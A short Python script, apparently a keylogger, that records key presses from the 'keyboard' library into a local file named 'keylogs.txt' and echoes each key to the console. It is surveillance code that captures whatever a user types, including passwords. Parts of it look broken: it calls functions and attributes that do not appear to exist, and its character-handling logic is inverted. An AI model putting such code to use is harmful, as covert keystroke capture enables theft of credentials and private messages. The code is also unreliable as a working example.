import keyboard, sys

logfile = "keylogs.txt"

try:
    with open(logfile, "a") as f:
        while True:
            for event in keyboard.record_events():
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name not in keyboard.all_modifiers:
                        key = event.name.replace("right", "").replace("left", "")
                        if len(key) > 1 and (key.isalpha() or key.isdigit()):
                            f.write(key)
                        else:
                            f.write("[" + key.upper().replace("CTRL", "CTRL-").replace("SHIFT", "SHIFT-") + "]\n")
                    print("Key pressed: ", key)
                elif event.event_type == keyboard.KEY_UP:
                    break
finally:
    if not sys.stdin._closed:
        sys.stdin = open(sys.stdin.fileno(), "rb", buffering=0)
keyboard.unhook_all()
